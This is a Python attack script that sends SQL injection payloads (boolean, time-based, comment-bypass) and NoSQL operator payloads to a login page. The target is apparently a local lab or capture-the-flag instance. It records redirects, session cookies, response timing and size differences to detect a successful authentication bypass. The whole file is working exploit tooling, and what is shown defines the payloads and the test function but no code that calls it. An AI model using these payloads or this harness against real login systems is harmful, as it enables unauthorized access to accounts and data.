import requests
import time
import json

# Target configuration
base_url = "http://127.0.0.1:33001"
login_url = f"{base_url}/login.php"

# Define all payload categories
payloads = {
    "sql_boolean": [
        "admin' AND '1'='1' --",
        "admin' OR '1'='1' --",
        "admin' AND 1=1 --",
        "admin' OR 1=1 --",
        "' OR 1=1 LIMIT 1 --",
        "' OR '1'='1' --",
        "' OR 1=1 --",
    ],
    "sql_time_based": [
        "admin' AND (SELECT * FROM (SELECT(SLEEP(3)))a) --",
        "admin' OR IF(1=1,SLEEP(3),0) --",
        "admin' AND pg_sleep(3) --",
        "admin'; WAITFOR DELAY '0:0:3' --",
    ],
    "comment_bypass": [
        "admin'#",
        "admin'/*",
        "admin'-- -",
        "admin';--",
    ],
    "alt_usernames": [
        "administrator'--",
        "root'--",
        "admin')--",
        "' or '1'='1",
        "admin' --",
        "admin'--",
    ],
    "nosql": [
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"username": {"$eq": "admin"}, "password": {"$gt": ""}}',
    ]
}

# Store results for comparison
baseline_response = None
anomalies = []
success_indicators = []

def test_payload(username, password, category, desc):
    """Test a single payload and capture results"""
    global baseline_response
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    data = {
        'username': username,
        'password': password
    }
    
    try:
        start_time = time.time()
        response = requests.post(
            login_url, 
            data=data, 
            headers=headers, 
            allow_redirects=False,
            timeout=10
        )
        elapsed_time = time.time() - start_time
        
        result = {
            'category': category,
            'payload': desc,
            'username': username,
            'password': password,
            'status_code': response.status_code,
            'response_time': round(elapsed_time, 2),
            'content_length': len(response.text),
            'has_incorrect': 'incorrect' in response.text.lower() or 'error' in response.text.lower(),
            'cookies': dict(response.cookies),
            'location': response.headers.get('Location', ''),
            'response_preview': response.text[:500].replace('\n', ' ')
        }
        
        # Check for success indicators
        is_anomaly = False
        anomaly_reasons = []
        
        # Time-based detection (response > 2.5s for time-based payloads)
        if elapsed_time > 2.5:
            anomaly_reasons.append(f"SLOW_RESPONSE ({elapsed_time:.2f}s)")
            is_anomaly = True
        
        # No "incorrect" message (possible success)
        if not result['has_incorrect'] and elapsed_time < 2.5:
            anomaly_reasons.append("NO_INCORRECT_MSG")
            is_anomaly = True
        
        # Session cookies set
        if result['cookies']:
            anomaly_reasons.append(f"COOKIES_SET: {result['cookies']}")
            is_anomaly = True
        
        # Redirect (302)
        if response.status_code == 302:
            anomaly_reasons.append(f"REDIRECT_TO: {result['location']}")
            is_anomaly = True
        
        # Different from baseline
        if baseline_response is not None:
            if abs(result['content_length'] - baseline_response['content_length']) > 50:
                anomaly_reasons.append(f"SIZE_DIFF: {abs(result['content_length'] - baseline_response['content_length'])}B")
                is_anomaly = True
        else:
            # Set baseline from first normal request
            baseline_response = result
        
        if is_anomaly:
            result['anomaly_reasons'] = anomaly_reasons
            anomalies.append(result)
        
        return result
        
    except Exception as e:
        return {
            'category': category,
            'payload': desc,
            'error': str(e)
        }

